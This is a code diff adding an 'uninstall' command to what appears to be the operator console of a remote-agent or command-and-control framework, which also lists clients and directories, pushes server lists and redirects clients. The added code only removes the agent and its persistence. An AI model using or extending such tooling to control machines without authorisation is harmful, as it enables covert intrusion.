@@ -343,6 +343,27 @@ async def cmd_listdir(conn, cfg, args):
             console.print(table)
 
 
+async def cmd_uninstall(conn, cfg, args):
+    if not state.selected:
+        console.print("[red]No client selected.[/]")
+        return
+    info = state.clients.get(state.selected, {})
+    host = info.get("hostname", state.selected[:8])
+    console.print(f"[yellow]⚠ Uninstalling agent on {host} ...[/]")
+    result = await send_command(conn, cfg, "uninstall", {})
+    if result:
+        if result.type == MessageType.COMMAND_ERROR:
+            console.print(f"[red]Error:[/] {result.payload.get('error')}")
+        else:
+            r = result.payload.get("result", result.payload)
+            if r.get("persistence_removed") is False:
+                console.print(f"[yellow]Persistence removal warning:[/] {r.get('persistence_error', '?')}")
+            else:
+                console.print("[green]✓ Persistence removed[/]")
+            console.print(f"[green]✓ {r.get('message', 'Agent is shutting down.')}[/]")
+            state.selected = None
+
+
 COMMANDS = {
     "list": cmd_list,
     "ls": cmd_list,
@@ -361,6 +382,7 @@ COMMANDS = {
     "redirect": cmd_redirect,
     "dir": cmd_listdir,
     "listdir": cmd_listdir,
+    "uninstall": cmd_uninstall,
 }
 
 HELP_TEXT = """
@@ -376,6 +398,7 @@ HELP_TEXT = """
   [cyan]dir[/] [path]                   List directory contents
   [cyan]servers[/] <uri> [<uri>...]     Push new server list to client
   [cyan]redirect[/] <uri>               Redirect client to new server
+  [cyan]uninstall[/]                    Remove agent from target machine
   [cyan]help[/]                         Show this help
   [cyan]quit[/] / [cyan]exit[/]                   Exit
 """
